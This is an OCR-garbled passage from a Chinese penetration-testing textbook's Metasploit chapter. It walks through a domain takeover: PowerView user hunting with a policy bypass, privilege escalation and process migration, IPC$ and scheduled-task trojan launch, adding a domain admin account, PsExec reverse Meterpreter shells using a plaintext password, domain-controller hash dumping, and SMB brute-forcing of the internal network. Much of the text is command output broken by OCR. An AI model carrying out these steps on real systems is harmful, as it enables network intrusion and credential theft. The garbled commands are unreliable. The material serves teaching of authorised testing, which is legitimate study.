OR
serino（Dcnain Usez)
leatiom
图5-120抓取Hash
接着查看抓到的域用户的权限，如图5-121所示。
---
## Page 270
第5章Metasploit技术251
C:\Windovssystem32>net user joao.guezino /dcmain
The
Ful1 Mae
Ouerino
Caer'a
sode
000(Syatem Default)
expires
active
ord last set
31/03/201419:48:08
31/03/201419:48:08
requxred
Yes
lerkstations allowed
A11
Last logon
10/12/201514:26133
Logon hours allowed
A11
ocal Group Menberahips
"eprocurement
The command conpleted successfully.
图5-121查看城用户的权限
5.9.5PowerShell寻找域管在线服务器
WindowsPowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编
写者可以利用.NETFramework的强大功能。PowerShell还允许将几个命令组合起来放
到文件里执行，实现文件级的重用，也就是说具有脚本的性质。
这里先使PowerView脚本来获取当域管理员在线登录的服务器，我们将Power
View脚本的Invoke-UserHunter模块上传到主机名为PAVMSEP131，IP为10.51.0.131的
服务器中，然后输入Invoke-UserHunter，如图5-122所示。
具体命令如下所示。
powershel1.exe -exec bypass -Command
“&{Import -Module - \powervlew.ps1;Invoke-UserHunter]"
---
## Page 271
252Web安全文防：渗透测试实成指南
xec bypass -Con
（
CbyF
11.com.b
omputexblane
NSV3MBS136..
1.com.b
10.54.0.13
10.54.0.136
LocalAdnin
CNAin
ms1313
.ccm.b
(10.54.0.50,10.54.0.4)
Looaladnin
10.11.1.11
main
na1313
cem.b:
PAMSSK.4.
....com.b
110.11.1.8
10.51.0...1
.ccm.br
owputexllaa
10.51.0.
...con.br
10.11.1.11
LoealAdmin
图5-122获取当前域管理员在线登录的服务器
可以看到域管理员当前在线登录的机器主机名为PAVMSXD30，IP为10.51.0.30，
此时需要入侵此服务器，然后将其迁移到域管理登录所在的进程，这样便拥有了域
管理的权限。
5.9.6获取域管权限
现在笔者成功地获取主机名为PAVMSXD30，IP为10.51.0.30的服务器权限，接下
来就可以渗透域控了。
首先输入getsystem命令提升权限，如图5-123和图5-124所示。
Server usern
me： MEDASIL\ma1246
esb...
图5-123输入getsystem命令进行提权
---
## Page 272
第5章Metasploit技术4253
图5-124查看当前用户
可以看到笔者现在的UID是sonicwall，从前面获取的域管理员账号信息中已知
sonicwall是域管理员。
然后输入ps命令找到域管理所在的进程，把MeterpreterShell进程迁移到此进程中，
成功后就获得了域管理权限，如图5-125所示。
Server usern
图5-125迁移进程
这里除了迁移进程，也可以使用Metasploi中的窃取令牌功能，同样能获得获得
域管理权限。
接着查看主域控IP，这里使用ncttime命令，一般来说时间服务器都是域服务器，
如图5-126所示。
meterpzeter>sheled
1cr
C:\indoua\ayaten32>net time
.con.br1a11/12/--
18:43:42
图5-126查看主域控IP
可以看到域服务器的主机名为PAVMSAD64，IP地址为10.51.0.63。
现在我们可以使用经典的IPCS入侵来反弹一个MeterpreterShell，具体操作如图
5-127和图5-128所示。
om.brles
on.br\et
The
dcompleted
图5-127IPC$渗透
定供商
---
## Page 273
254Web安全政防：渗造测试实战指南
at\FAVMSAD64
1.com.br 18:55:25c\pay
at is not supp
图5-128使用at命令启动木马
提示at命令已经被弃用，因为目标机的系统是Windows2012，现在使用schtasks
命令来添加计划任务。因为现在已经在域管理员权限下面了，所以要给域控添加一
个管理员账户，如图5-129所示。
k183/as/domain
183/
nd conpleted suce
图5-129添加域管理员账户
利用如下命令确认账户是否添加成功，如图5-130所示。
21878
011905
fully.
图5-130查看域管理员组
可以看到笔者已经成功添加了管理员账户。
5.9.7
登录域控制
现在域控的权限也终于到手了。接下来就要登录域控，然后抓域控的Hash。
---
## Page 274
第5章Metasploit技术4255
常见的登录域控的方式有以下这几种。
利用IPC上传AT&Schtasks远程执行命令。
利用端口转发或者Socks登录域控远程桌面。
登录对方内网的一台计算机使用PsTools工具包中的PsExec来反弹Shell。
使用Metasploit 下的PsExec、psexec_psh、Impacket psexec、pth-winexe、Empire
Invoke-Psexec等PsExec类工具反弹Shell。
使用Metasploit下的smb_login来反弹Meterpreter。
使用WMI（WindowsManagement Instrumentation）来进行攻击。
使用PsRemotingposershel远程执行命令。
其他一些方法。
这里采用最常见也是效果最好的方式，即Metasploit下的PsExec来反弹Meterpreter，
使用时要注意以下这两点，如图5-131所示。
MSF中的PsExec模块
cuestom模块，建议使用类似Veil之类的工具来生成免杀的Payload。
fexploit（
afexploit
)>set smbpass Passv0rk！83
）>set snbdomain MEDABIL
afexploit（
Exploit failed: The fo1loving optiona failed to validate:RH0ST
host=>10.51.0.64
)>aetxhost10.51.0.64
f exploit（
）>run
30:4444
to the ser
10.51.0.64:445-Executing the payload...
[+]10.51.0.64:445 - Service start timed out, OK 1f running a command or 
图5-131使用PsExec模块反弹Meterpreter
可以看到已经反弹成功了，然后先迁移进程，查看域控的系统信息和sessions控
---
## Page 275
256Web安全政防：渗造测试实战指南
制图，如图5-132和图5-133所示。
Migrating from 9912 to 2416...
seterprecer
onguter
：PAVNSAD64
:Windows 2012 (Bui1d 9200).
Architecture
：x64
Syatem Language
：
MEDABIL
pt_BR
Logged Cn Users
：16
:x64/vin64
图5-132迁移进程
fpost(
Id
Type
Information
Connection
meterpreter x86/vin32
meterpreter x86/vin32
45.
45.
meterpreter x86/vin32
NT AUTHORITYSYSTEM9PAVMSDI142
MEDABIL8Wal18PAVSXD30
45.
45.'
.3.30:443
NT AUTHORITYSYSTEM PAVMSAD64
45.*.
.30:443
.30:8443->
图5-133查看sessions
思路：可以看到现阶段控制的session共有5个。session1为WebShell反弹，session2
利用ipeS入侵，渗透session4的目的是获取域管在线服务器，scssion5为域。整个渗透
过程一环套一环，环环相扣。
有了域控的权限，接着来抓Hash，常用方法有以下这几种。
使用Metasploit自带的dumphash或者smart_hashdump模块导出用户的Hash。
利用PowerShell的相应模块导出Hash。
使用WCE、Mimikatz等工具。
其他方法。
---
## Page 276
第5章Metasploit技术257
这里使用了Metasploit自带的dumphash模块。需要注意，要想使用此模块导出Hash，
必须有SYSTEM的权限才行，具体操作如图5-134所示。
af post(s
suotado noue set sessicn 5
mafpost（
)>run
Hashes will be
ainst PAVNSAD64
lashes
W111b
ping passvord hasbes...
图5-134抓取域Hash
5.9.8
SMB爆破内网
有了域控的密码，接下来只要快速在内网扩大控制权限就好，具体操作如下所
示。
利用当前获取的域控账户密码，对整个域控IP段进行扫描。
使用SMB下的smb_login模块。
端口转发或者Socks代理进内网。
我们先在Metasploit添加路由，然后使用smb_login模块或者psexec_scanner模块进
行爆破，具体操作如图5-135~图5-137所示。
---
## Page 277
258Web安全政防：渗透测试实战指南
meterpretez>background
Back:
ding
)>route add10.51.0.1255.255.0.02
fexploit
t)>search smb_1ogin
tehing Modales
Sant
Disclosure Date
Rank
auxiliary/scar
b_ntlnl_login_corrupt
auxillaryc
xploit
iler)>use auxiliary/acanner/smb/ssb_login
>10.51.0.131/24
>et xhoata10.51.0.
'-/24
in）>set amuaer
MEDABTL
gi=) > set sabc
main MEDABIL
in)>aet threads 16
围5-135设置smb_login模块
10-51.0.27:445 SMB
10.51.0.20:445
10.51.0.17:445
SMB
10.51.0.16:445
SMB
SMB
Sur
10.51.0.18:445388
图5-136开始扫描内网
origin
service
0.1.16.122
10.1.14.200
10.1.16.200
445/tcp
145/tp
(ssb)
(snb)
445/tcp
(ssb)
445/tm
45
145.
155/tom
图5-137整理扫描结构